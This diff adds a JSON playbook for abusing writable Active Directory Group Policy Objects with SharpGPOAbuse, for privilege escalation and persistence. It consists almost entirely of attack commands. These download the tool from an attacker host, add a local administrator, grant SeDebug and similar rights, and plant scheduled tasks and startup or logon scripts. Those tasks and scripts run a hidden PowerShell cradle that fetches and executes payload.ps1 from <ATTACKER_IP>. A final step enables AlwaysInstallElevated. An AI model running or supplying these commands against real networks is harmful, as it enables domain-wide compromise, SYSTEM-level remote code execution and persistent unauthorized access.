@@ -1,0 +1,61 @@
+{
+	"name": "SharpGPOAbuse - Group Policy Object Abuse Toolkit",
+	"description": "A .NET tool to abuse edit rights on Group Policy Objects (GPOs) for privilege escalation and persistence in Active Directory environments.",
+	"tools": [
+		{
+			"name": "SharpGPOAbuse",
+			"description": "C# tool for abusing writable GPOs to add local admins, user rights, scheduled tasks, startup scripts, registry keys, etc.",
+			"url": "https://github.com/NukingDragons/SharpGPOAbuse"
+		}
+	],
+	"steps": [
+		{
+			"index": 1,
+			"name": "Download and Execute SharpGPOAbuse",
+			"command": "Invoke-WebRequest -Uri http://<ATTACKER_IP>/SharpGPOAbuse.exe -OutFile SharpGPOAbuse.exe; ./SharpGPOAbuse.exe",
+			"description": "Transfer and execute the binary on a domain-joined Windows host (can also be executed in-memory with tools like Cobalt Strike, Covenant, etc.)."
+		},
+		{
+			"index": 2,
+			"name": "Add Local Administrator via GPO",
+			"command": "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName \"Vulnerable GPO\"",
+			"description": "Adds the specified user as local administrator on all computers affected by the targeted GPO."
+		},
+		{
+			"index": 3,
+			"name": "Grant User Rights (e.g., SeTakeOwnershipPrivilege, SeDebugPrivilege)",
+			"command": "SharpGPOAbuse.exe --AddUserRights --UserRights \"SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight,SeDebugPrivilege\" --UserAccount attacker --GPOName \"Vulnerable GPO\"",
+			"description": "Grants powerful user rights to the specified account across all systems linked to the GPO."
+		},
+		{
+			"index": 4,
+			"name": "Add Immediate Scheduled Task (Computer Context)",
+			"command": "SharpGPOAbuse.exe --AddComputerTask --TaskName \"SystemUpdate\" --Author \"DOMAIN\\Domain Admin\" --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/payload.ps1'))\" --GPOName \"Vulnerable GPO\"",
+			"description": "Creates an immediate scheduled task that runs in SYSTEM context on next GP update (typically within minutes)."
+		},
+		{
+			"index": 5,
+			"name": "Add Immediate Scheduled Task (User Context with Filtering)",
+			"command": "SharpGPOAbuse.exe --AddUserTask --TaskName \"UserUpdate\" --Author \"DOMAIN\\Domain Admin\" --Command \"cmd.exe\" --Arguments \"/c powershell.exe -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/payload.ps1'))\" --GPOName \"Vulnerable GPO\" --FilterEnabled --TargetUsername \"DOMAIN\\targetuser\"",
+			"description": "Deploys a user-context immediate task that only triggers for a specific user (optional targeting)."
+		},
+		{
+			"index": 6,
+			"name": "Add Startup Script (Computer Context)",
+			"command": "SharpGPOAbuse.exe --AddComputerScript --ScriptName \"startup.bat\" --ScriptContents \"powershell.exe -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/payload.ps1'))\" --GPOName \"Vulnerable GPO\"",
+			"description": "Adds a startup script that executes as SYSTEM on every boot of affected machines."
+		},
+		{
+			"index": 7,
+			"name": "Add User Logon Script",
+			"command": "SharpGPOAbuse.exe --AddUserScript --ScriptName \"logon.bat\" --ScriptContents \"powershell.exe -nop -w hidden -c IEX((New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/payload.ps1'))\" --GPOName \"Vulnerable GPO\"",
+			"description": "Adds a script that runs in the context of every user who logs into machines linked to the GPO."
+		},
+		{
+			"index": 8,
+			"name": "Enable AlwaysInstallElevated Registry Key",
+			"command": "SharpGPOAbuse.exe --AddRegistryKey --Hive HKLM --KeyPath \"Software\\Policies\\Microsoft\\Windows\\Installer\" --KeyName AlwaysInstallElevated --KeyType REG_DWORD --KeyData 1 --GPOName \"Vulnerable GPO\"",
+			"description": "Sets the AlwaysInstallElevated policy to allow any user to install MSI packages with SYSTEM privileges."
+		}
+	]
+}
